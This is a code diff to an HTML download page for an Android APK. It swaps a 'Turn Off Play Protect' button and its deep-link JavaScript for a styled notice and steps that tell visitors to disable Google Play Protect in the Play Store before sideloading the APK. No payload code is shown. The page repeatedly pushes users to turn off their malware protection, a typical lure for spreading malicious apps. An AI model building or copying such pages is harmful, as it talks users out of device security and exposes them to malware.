@@ -358,13 +358,6 @@ a{text-decoration:none;color:inherit}
   transform:translateY(-1px);
   box-shadow:0 16px 34px rgba(57,120,255,.26);
 }
-.download-button.secondary{
-  background:linear-gradient(110deg,#e84545,#c92a2a);
-  box-shadow:0 13px 30px rgba(233,69,69,.18);
-}
-.download-button.secondary:hover{
-  box-shadow:0 16px 34px rgba(233,69,69,.26);
-}
 .button-arrow{
   width:34px;height:34px;
   border-radius:9px;
@@ -372,6 +365,34 @@ a{text-decoration:none;color:inherit}
   background:rgba(255,255,255,.13);
 }
 .button-arrow svg{width:16px;height:16px}
+
+/* ---- NEW: Instruction message style ---- */
+.manual-instruction{
+  margin-top:16px;
+  padding:14px 16px;
+  border-radius:12px;
+  background:rgba(255,255,255,.025);
+  border:1px solid rgba(255,255,255,.06);
+  display:flex;
+  align-items:flex-start;
+  gap:12px;
+  color:#aab3c1;
+  font-size:13px;
+  line-height:1.6;
+}
+.manual-instruction .icon{
+  font-size:18px;
+  flex-shrink:0;
+  margin-top:1px;
+}
+.manual-instruction strong{
+  color:#e0e6ef;
+  font-weight:600;
+}
+.manual-instruction .highlight{
+  color:#ffb347;
+  font-weight:500;
+}
 
 .file-details{
   display:flex;
@@ -463,6 +484,7 @@ a{text-decoration:none;color:inherit}
   .step-title-row{gap:10px}
   .step-icon{width:34px;height:34px}
   .file-details{font-size:9px}
+  .manual-instruction{font-size:12px;padding:12px 14px}
 }
 </style>
 
@@ -572,15 +594,15 @@ a{text-decoration:none;color:inherit}
             </div>
             <p>Before installing the APK, please turn off Google Play Protect. Then download the APK and install it on your Android device.</p>
 
-            <!-- ===== TURN OFF PLAY PROTECT BUTTON ===== -->
-            <button class="download-button secondary" id="playProtectBtn">
-              <span>🔒 Turn Off Play Protect</span>
-              <span class="button-arrow">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                  <path d="M5 12h13"/><path d="m13 6 6 6-6 6"/>
-                </svg>
+            <!-- ===== NEW: Manual instruction (button removed) ===== -->
+            <div class="manual-instruction">
+              <span class="icon">ℹ️</span>
+              <span>
+                <strong>Before downloading,</strong> please manually turn off 
+                <span class="highlight">Play Protect</span> from your 
+                <strong>Play Store</strong> app, then download &amp; install the APK.
               </span>
-            </button>
+            </div>
 
             <!-- ===== DOWNLOAD APK BUTTON ===== -->
             <a href="#" class="download-button" download>
@@ -603,7 +625,7 @@ a{text-decoration:none;color:inherit}
             <div class="instructions">
               <div class="instruction">
                 <span class="instruction-number">01</span>
-                <span><strong>Turn off Play Protect</strong> before installing.</span>
+                <span><strong>Turn off Play Protect</strong> manually from Play Store.</span>
               </div>
               <div class="instruction">
                 <span class="instruction-number">02</span>
@@ -617,7 +639,7 @@ a{text-decoration:none;color:inherit}
 
             <div class="info-box">
               <span class="info-symbol">i</span>
-              <span>Please make sure Play Protect is turned off before starting the APK installation.</span>
+              <span>Make sure Play Protect is turned off before you start the APK installation.</span>
             </div>
           </div>
         </article>
@@ -633,49 +655,7 @@ a{text-decoration:none;color:inherit}
 
 </div>
 
-<!-- ===================================================== -->
-<!-- ===== JAVASCRIPT: PLAY PROTECT PAGE TARGET ===== -->
-<!-- ===================================================== -->
-<script>
-(function () {
-  const btn = document.getElementById('playProtectBtn');
-  if (!btn) return;
-
-  btn.addEventListener('click', function (e) {
-    e.preventDefault();
-
-    const isAndroid = /Android/i.test(navigator.userAgent);
-
-    if (!isAndroid) {
-      window.open('https://play.google.com/store/account', '_blank', 'noopener');
-      return;
-    }
-
-    // ===== PLAY PROTECT PAGE OPEN KARNE KA TARGET =====
-    // Play Store "My apps & games" -> yahan Play Protect tab hai
-    const playStoreMyApps = 
-      'intent://play.google.com/store/account#Intent;' +
-      'scheme=market;' +
-      'package=com.android.vending;' +
-      'end';
-
-    let pageLeft = false;
-    const onVisibilityChange = () => { pageLeft = true; };
-    document.addEventListener('visibilitychange', onVisibilityChange, { once: true });
-
-    // Play Store "My apps" page open karein
-    window.location.href = playStoreMyApps;
-
-    // Agar 1.5 sec mein page nahi change hua toh web version open karein
-    setTimeout(function () {
-      if (!pageLeft && document.visibilityState === 'visible') {
-        window.open('https://play.google.com/store/account', '_blank', 'noopener');
-      }
-    }, 1500);
-  });
-})();
-</script>
-
+<!-- No JavaScript needed now -->
 </body>
 
 </html>
